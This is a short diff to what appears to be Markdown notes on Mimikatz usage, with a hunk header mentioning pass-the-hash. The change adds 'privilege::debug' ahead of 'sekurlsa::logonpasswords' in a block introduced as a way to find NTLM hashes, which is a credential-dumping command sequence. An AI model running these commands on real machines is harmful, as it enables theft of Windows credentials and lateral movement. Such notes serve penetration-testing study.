@@ -142,6 +142,7 @@ sekurlsa::pth
 ```
 to find the NTLM hashes
 ```shell
+privilege::debug  
 sekurlsa::logonpasswords
 ```
 
